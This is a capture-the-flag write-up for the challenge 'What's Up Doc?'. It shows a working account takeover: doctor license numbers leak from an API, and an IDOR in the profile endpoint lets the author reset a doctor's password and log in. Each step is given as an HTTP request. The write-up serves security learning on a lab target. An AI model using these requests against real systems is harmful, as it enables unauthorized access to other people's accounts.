---
title: "What's Up Doc?"
date: 2026-08-15
description: An IDOR in the profile update endpoint lets you take over any doctor account by submitting their license number & name.
---
# "What's Up Doc?"

**Challenge:** https://ctf.urisc.club/challenges#What's%20Up%20Doc?-18

**Goal:** You're in, but there's nothing here? Seems like we need to go deeper. Can we get more access as a doctor?

**Flag:**
- `SRCTF!{an_apple_a_day}` - on the dashboard of any pre-registered doctor

---

## Vulernability

`POST /dashboard/profile` has an **IDOR (Insecure Direct Object Reference)**.

The profile update form looks up the user by the **`license` field you submit**, NOT by the session's `user_id`. So you can submit **anyone's** license number and change their `full_name` and `password`.

Real doctor license numbers are leaked by the API:

```
GET /api/users/getRegistered
```

...which returns every registered user including their `License`, `Name`, `Manager`, and `Organisation`.

## Attack Path

### 1. Log in as the newly registered user (from patient-zero)

```
POST /login/
license=MED0012345678
password=test
```

This gives you a session cookie, e.g. `{"role":"registered","user_id":96163}`.

### 2. Grab a real doctor's license

```
GET /api/users/getRegistered
```

Pick any doctor, e.g.:

```json
{
  "License": "MED0000282459",
  "Name": "Dr. Ingrid Solberg",
  "Manager": "Dr. Liam Prosser",
  "Organisation": "Silverton Health Partners"
}
```

### 3. Take over the doctor via the profile IDOR

Send the doctor's license to the profile update endpoint with a **new password** (and restore their name so nothing looks broken):

```
POST /dashboard/profile
license=MED0000282459
full_name=Dr. Ingrid Solberg
password=pwd
```

The server updates **Dr. Ingrid Solberg's** password because it looks up by the submitted license.

### 4. Log in as the doctor

```
POST /login/
license=MED0000282459
password=pwd
```

### 5. Grab the flag

```
GET /dashboard/
```

The dashboard now shows the news card:

```
Doctors must stay up-to-date with patient privacy laws! SRCTF!{an_apple_a_day}
```

---

## Notes

- This was MUCH easier than we originally thought. After spending about two and a half hours trying to unsign what we thought was a session token using the Flask session key, we realised there was a directly accessible API endpoint `(/api/users/getRegistered/)` that returned the registered users. How embarrassing!